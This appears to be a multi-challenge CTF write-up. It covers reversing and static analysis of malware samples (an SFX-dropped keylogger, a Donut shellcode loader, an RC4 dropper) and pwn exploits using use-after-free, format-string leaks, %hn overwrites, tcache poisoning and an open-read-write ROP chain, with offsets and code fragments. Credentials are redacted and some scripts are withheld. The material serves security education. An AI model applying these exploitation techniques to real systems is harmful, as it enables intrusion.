text: XOR is reversible, so I iterated over the target bytes with the same state progression and solved input[i] = target[i] ^ i ^ state ^ 0x4d. Updating state with the recovered character yields the next character.
The recovered 36-byte string satisfied the check and was the flag.

code.text:
state = 0x13
flag = ""
for i, value in enumerate(target):
    ch = value ^ i ^ state ^ 0x4d
    flag += chr(ch)
    state = ch
print(flag)

challenges.result: Unpacking exposed a reversible chained-XOR checker; replaying it backwards recovered the required melody.
challenges.learned: Packer detection should precede deep static analysis. A validation loop that carries state between bytes can still be inverted when every operation is reversible.
challenges.todo: The source PDF contains no decompiler or solver-output screenshot for this challenge; the steps and inline code follow its written analysis.

challenges.title: Video Launcher
challenges.overview: VideoLauncher.exe is a WinRAR SFX dropper, not a video launcher. Its SFX configuration starts a decoy MP4 and WinSystemUpdate.exe, a PyInstaller payload containing keylog.pyc.
challenges.analysis: The SFX setup entries establish which extracted file is the real payload. I followed that chain offline: unpack the SFX, extract the PyInstaller application, and inspect the recovered keylogger configuration rather than executing it.

steps.title: Identify the SFX dropper
text: The challenge page warns that the file should be analysed in a virtual machine. Static inspection showed the SFX configuration runs chilllll.mp4 as a decoy and WinSystemUpdate.exe as the actual payload.

images.alt: VideoLauncher challenge page and malware-analysis warning
images.caption: The challenge page identifies the suspicious launcher and calls for isolated analysis.

steps.title: Extract the nested PyInstaller payload
text: I extracted the WinRAR SFX archive, then used pyinstxtractor on WinSystemUpdate.exe. Searching the extracted contents found keylog.pyc, confirming the Python malware stage.

code.text:
7z x VideoLauncher.exe -osfx_out
cd sfx_out
python3 pyinstxtractor.py WinSystemUpdate.exe
find WinSystemUpdate.exe_extracted -iname '*keylog*'

steps.title: Recover the flag safely
text: The extracted configuration used Fernet and contained Telegram delivery details. Those details included a real token and personal chat identifiers, so they are not reproduced in the page or download.

The team write-up's recovery workflow forwards the attacker-chat history in an authorised CTF setting and searches each response for the UMCS format. The sanitised downloadable script preserves that logic but replaces credentials with placeholders.

challenges.result: The nested executable was identified as a Telegram-delivered keylogger. The team’s recovered message history contained the flag.
challenges.learned: SFX launchers can conceal a payload behind a benign decoy. Malware configuration and message-delivery credentials are sensitive even in a CTF artefact and must be redacted from a public walkthrough.
challenges.todo: The source PDF contains no extraction or recovery-output screenshot; the original output also includes credentials that must remain redacted.

challenges.title: Donut Calculator
challenges.overview: calculator.exe contains a Donut shellcode instance embedded in its .data section. The embedded instance uses Chaskey CTR, then contains a second PE whose data holds two XOR-protected flag components.
challenges.analysis: The E8 BD 1E 02 00 pattern is a call followed by a 0x21ebd-byte Donut instance. That layout, rather than dynamic execution, gave a controlled static route to the encrypted payload and its keys.

steps.title: Identify the Donut instance
text: I inspected .data and found the call opcode E8 followed by the instance length 0x21ebd. The bytes immediately after the call are the encrypted Donut instance, and the remaining bytes are loader code.

images.alt: Donut Calculator challenge page
images.caption: The calculator download is the host PE whose .data section contains the Donut instance.

steps.title: Decrypt and carve the embedded PE
text: The instance provides a Chaskey CTR key and counter. I used them to decrypt the encrypted portion, then searched the plaintext for an MZ header and carved the embedded PE beginning at decrypted_instance + 0x1288.
This avoids executing either stage and preserves a reproducible static workflow.

steps.title: Recover and join both flag components
text: The embedded PE’s nice() routine exposes nPcSeCreT and nPcF1aG. XORing the data with the first key reveals an encoded PowerShell command whose decoded text contains the first flag component; the second key reveals the suffix.
Joining those two strings produces the final flag.

code.text:
key1 = b'nPcSeCreT'
key2 = b'nPcF1aG'
# XOR with key1 to recover the PowerShell command, then with key2 for the suffix

challenges.result: Static decryption of the Donut instance exposed the embedded PE and its two XOR-protected flag components.
challenges.tools: PE inspection, Python, Chaskey CTR analysis, XOR analysis
challenges.learned: A shellcode container can embed several reversible layers. Identifying each boundary — host section, encrypted instance, embedded PE, then data — makes a complex sample tractable.
challenges.todo: The source’s long solver is split across PDF pages with damaged indentation in text extraction; no runnable download is published until its full indentation can be verified. The source PDF has no solver-output screenshot.

challenges.title: HORUS
challenges.overview: HORUS is a dropper that copies an encrypted .rdata blob, decrypts it with RC4, and writes a fake updater. The decrypted .NET stage has a CliLoader class that validates a hex key before decrypting its own cipher text.
challenges.analysis: The outer binary stores the RC4 key plainly as deadbeefcafebabe. Its MD5 exactly matches the expected value in CliLoader, so the same key satisfies the inner key check and is the justified key for the final static decrypt.

steps.title: Map the outer dropper
text: Static disassembly showed allocation, a copy from .rdata, RC4 decryption, and writing the result as a fake Startup updater. The source identifies the encrypted range as 0x5bcc00 bytes starting at file offset 0x82d0.

images.alt: HORUS challenge page and malware-analysis warning
images.caption: HORUS is presented as real-malware analysis and is handled statically in the write-up.

steps.title: Validate the inner key
text: In YouAreAnIdiot-UnFlash, CliLoader checks the last six hexadecimal characters of the MD5 of its supplied key. The MD5 of bytes.fromhex('deadbeefcafebabe') matches the recorded expected MD5, linking the two layers.

steps.title: Decrypt cipherHex with RC4
text: I used the same RC4 routine on CliLoader's cipherHex value. The sanitised full helper is provided as a download and prints the recovered flag without executing the dropper.

challenges.result: The outer RC4 key passed the inner MD5 check and decrypted the CliLoader cipher text to the flag.
challenges.tools: Static disassembly, .NET inspection, Python, hashlib, RC4
challenges.learned: Keys and integrity checks reused across stages can connect otherwise separate layers of a dropper. Static extraction avoids running malware while still allowing cryptographic validation.
challenges.todo: The source PDF contains no decompiler or final solver-output screenshot.

challenges.title: Cyber BlindBox
challenges.overview: blindbox is a stripped 64-bit ELF menu challenge. Its shelf boxes carry a print_desc function pointer, and review() writes into a freed object, creating a UAF/double-free route to test control of that pointer.
challenges.analysis: I used objdump around system@plt and the print path to locate secret_grant and the box function-pointer layout. The review write begins at box+8 on the uploaded binary, an important detail that changes whether the intended ret2win overwrite reaches box+0.

steps.title: Recon the stripped ELF and struct layout
text: I confirmed the ELF properties, then searched the disassembly around system@plt and the shelf-print call. The print routine calls box->print_desc(box), so a controllable pointer at box+0 would control execution.

code.text:
file blindbox
objdump -d blindbox | grep -B 5 'system@plt'
objdump -d -M intel blindbox | grep -A20 '4016f6'

images.alt: Cyber BlindBox challenge page
images.caption: The challenge supplies the stripped blindbox binary and a remote instance.

steps.title: Exercise the UAF and double free
text: I drew a box in slot 0, discarded it without clearing shelf[0], then reviewed the dangling object to corrupt its tcache key. A second discard passes the tcache double-free check and two subsequent draws alias the same chunk.

code.text:
draw(io)
discard(io, 0)
review(io, 0, b'A' * 39)
discard(io, 0)
draw(io)
draw(io)

steps.title: Test the function-pointer overwrite
text: I attempted the ret2win overwrite with secret_grant at the start of the reviewed chunk, then displayed the shelf. The captured run prints secret_grant and print_desc addresses and returns the flag.

The source also notes a version-specific caveat: on the uploaded binary review begins at box+8, so a direct write does not change print_desc at box+0. That observation is retained because it explains the exploit discrepancy.

images.alt: Sanitised Cyber BlindBox solver output showing function addresses and flag
images.caption: The solver run displays the relevant function addresses and the returned flag; the original local prompt was cropped out.

challenges.result: The UAF/double-free analysis located the function-pointer target and the captured authorised run returned the flag, while documenting the uploaded-binary offset caveat.
challenges.learned: Heap exploits depend on exact object offsets, not just a familiar bug class. A proof of a double free is not automatically a proof that the chosen overwrite reaches the intended field.

challenges.title: Black Flash
challenges.overview: Black Flash combines a format-string read with a later stack-buffer overflow. PIE and a stack canary are enabled, so the first primitive leaks the values needed to preserve the canary and calculate win().
challenges.analysis: A %p sweep identified the stack canary at offset 21 and a return address into main at offset 23. The disassembly places the instruction after call vuln at 0x1548, allowing the PIE base and win address to be derived.

steps.title: Map the two vulnerabilities
text: The challenge page frames the task as synchronising a shifting target. Disassembly showed printf receives the first 0x70-byte input directly, while a later fgets reads 0x100 bytes into a 0x80-byte buffer.

images.alt: Black Flash challenge page
images.caption: The challenge page introduces the PIE- and canary-protected target.

steps.title: Leak the canary and PIE address
text: I sent %p. repeatedly and parsed the returned stack words. Offset 21 gives the canary; offset 23 is main's return address, so pie_base = leaked_address - 0x1548 and win = pie_base + 0x1261.

code.text:
%p.  # repeated 25 times
PIE base = leaked_main_return - 0x1548
win = PIE base + 0x1261

steps.title: Overflow while preserving the canary
text: The final payload uses 0x78 bytes of padding, the leaked eight-byte canary, eight junk bytes for saved RBP, and the calculated win address for RIP. The full team script is available with its remote target replaced by a placeholder.

challenges.result: The format string disclosed the canary and PIE base; the second read used those values to redirect execution to win().
challenges.learned: Format-string and overflow primitives compose: one can make a mitigation-aware payload possible for the other. The exact leak indices and post-call offset are the critical reproducibility details.
challenges.todo: The source PDF contains no exploit-output screenshot.

challenges.title: Spinning Cat
challenges.overview: Spinning Cat has PIE enabled and calls a local song function pointer after printing user input. The intended path is a format-string leak followed by a partial overwrite of song from sing_oiia() to win().
challenges.analysis: The hint about pie points to a runtime address leak. %7$p leaks sing_oiia and %42$p leaks a nearby stack address; together they provide the PIE base and the address of the local function-pointer slot.

steps.title: Identify the indirect call
text: The program stores void (*song)() = sing_oiia and calls song() after printf. Redirecting that pointer to win() avoids needing a return-address overwrite.

images.alt: Spinning Cat challenge page and downloadable runtime files
images.caption: The challenge provides the PIE binary and its matching libc and loader.

steps.title: Derive PIE and function-pointer addresses
text: I leaked sing_oiia with %7$p and the stack reference with %42$p. The source gives pie = sing - 0x12ee, win = pie + 0x1251, and fp_slot = leak42 - 0x138.

code.text:
%7$p.%42$p
pie = leaked_sing_oiia - 0x12ee
win = pie + 0x1251
fp_slot = leak42 - 0x138

steps.title: Partially overwrite song with %hn
text: Because sing_oiia and win are close inside the same PIE mapping, only the low two bytes change: 0x12ee to 0x1251. I built a %hn payload that writes win & 0xffff to fp_slot; when printf returns, song() calls win().

challenges.result: Runtime leaks located both PIE and the local pointer. A two-byte format-string write redirected song() to win() and printed the flag.
challenges.tools: Python, format-string analysis, pwntools-style socket handling
challenges.learned: A partial pointer overwrite can be enough when two functions share a PIE base. Stack leaks are useful not only for return addresses but also for locating adjacent local variables.
challenges.todo: The source PDF contains no solver-output screenshot and its multi-page script extraction has damaged indentation; a download awaits a verified reconstruction.

challenges.title: RetinaScan
challenges.overview: RetinaScan is a GLIBC 2.35 heap-menu target with a use-after-free and seccomp. The solve uses tcache poisoning to leak libc, the safe-linking key, and environ, then writes an open-read-write ROP chain to main's saved RIP.
challenges.analysis: A shell is blocked by seccomp, so the objective is ORW. The remote exploit initially appeared broken because edit() performed a short read; adding a ROP_OK! write marker proved RIP control before the failing open call.

steps.title: Plan leaks around the heap protections
text: I used a 0x500 allocation and free to leak main_arena from the unsorted bin, then freed a tcache-sized chunk to recover its safe-linking key. Tcache poisoning then allocates over libc.environ to leak a stack address.

images.alt: RetinaScan challenge page
images.caption: The challenge identifies seccomp and GLIBC 2.35 as central constraints.

steps.title: Prove saved-RIP control with a marker
text: The source found the remote saved-RIP offset at 0x120. I poisoned a 0x400 tcache entry onto the stack, wrote the ROP chain, and enabled the sensor.
Before attempting open(), the chain writes ROP_OK! to stdout. The captured execution shows the libc and environ leaks followed by that marker, proving the stack overwrite and RIP control worked.

images.alt: Sanitised RetinaScan exploit output showing leaks and ROP_OK marker
images.caption: The ROP_OK marker confirms that the staged chain reaches controlled execution before file access.

steps.title: Fix the remote short read with a staged path
text: The first ROP layout placed the pathname late in the initial edit payload. Remote edit() truncated that tail, so open() received garbage even though ROP_OK! printed.

I changed the chain to call read(0, path_buf, 0x80) after the marker, then issue raw SYS_open, move the returned file descriptor with xchg edi, eax; ret, and read/write the file. This avoids assuming fd 3.

code.text:
write(1, "ROP_OK!\n", 8)
read(0, path_buf, 0x80)
open(path_buf, O_RDONLY, 0)
xchg edi, eax
read(fd, out_buf, 0x200)
write(1, out_buf, 0x200)

steps.title: Use the filesystem delta and retrieve the flag
text: I first requested /proc/self/environ through the staged read and learned the process working directory. That showed /flag.txt was wrong; the final retry sends the relative path flag.txt.
The final captured run shows the marker, the staged path, and the recovered flag. Local terminal prompts were removed from the published image.

images.alt: Sanitised RetinaScan final exploit output showing ROP marker and flag
images.caption: The final staged run sends flag.txt after ROP_OK and prints the flag.

challenges.result: Tcache poisoning reached the saved return address, the ROP marker diagnosed a remote short read, and the staged pathname read allowed the ORW chain to return the flag.
challenges.tools: Python, pwntools, GLIBC 2.35 heap analysis, ROP, seccomp-aware syscall analysis
challenges.learned: A visible execution marker isolates control-flow failures from later data-flow failures. In remote exploitation, a staged input can make a ROP chain robust against short reads and unknown file-descriptor allocation.
challenges.todo: The source’s long exploit spans several PDF pages and text extraction damages indentation; no runnable download is published until a complete reconstruction can be verified.
